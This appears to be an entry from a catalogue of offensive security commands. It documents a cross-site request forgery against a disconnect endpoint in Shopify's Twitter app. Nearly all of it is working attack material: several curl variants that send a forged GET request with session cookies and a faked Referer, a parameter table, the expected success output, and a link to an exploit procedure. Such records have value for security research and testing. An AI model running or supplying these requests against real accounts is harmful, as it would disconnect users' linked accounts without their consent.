---
id: cmd-uuid-001
name: csrf-twitter-disconnect-get
type: command
executor: curl
data: >-
  curl -X GET "https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect"
  -H "Host: twitter-commerce.shopifyapps.com" -H "User-Agent: Mozilla/5.0
  (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/20100101 Firefox/43.0" -H
  "Accept: text/html, application/xhtml+xml, application/xml" -H
  "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H
  "Referer: https://twitter-commerce.shopifyapps.com/account" -H "Cookie:
  _twitter-commerce_session=...; _ga=...; _gat=1" -H "Connection: keep-alive"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:42.521Z'
platforms:
  - Web
tags:
  - csrf
  - http
  - web
verified: false
validated: true
submitted: true
---

# csrf-twitter-disconnect-get

## Command

```bash
curl -X GET "https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect" -H "Host: twitter-commerce.shopifyapps.com" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/20100101 Firefox/43.0" -H "Accept: text/html, application/xhtml+xml, application/xml" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H "Referer: https://twitter-commerce.shopifyapps.com/account" -H "Cookie: _twitter-commerce_session=...; _ga=...; _gat=1" -H "Connection: keep-alive"
```

## Description

This command sends a forged GET request to the vulnerable CSRF endpoint in Shopify's Twitter app, simulating the browser-triggered disconnect action using session cookies for authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| Endpoint URL | The vulnerable disconnect path | Yes |
| `-H "Host"` | Sets the target host header | Yes |
| `-H "User-Agent"` | Mimics a browser user agent | Yes |
| `-H "Cookie"` | Includes authentication session cookies | Yes |
| `-H "Referer"` | Fakes the referer from the app | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect" -H "Cookie: _twitter-commerce_session=example"
```

### Advanced Usage

```bash
curl -X GET "https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect" -H "Cookie: _twitter-commerce_session=...; _ga=..." -H "Referer: https://twitter-commerce.shopifyapps.com/account" --verbose
```

## Expected Output

HTTP response (e.g., 200 OK or 302 redirect) indicating successful disconnection; body may show a success message or redirect to the account page. Verify by checking Shopify app status.

## Related

- [[Related Procedure|procedures/Exploit-CSRF-to-Disconnect-Twitter-Account]]
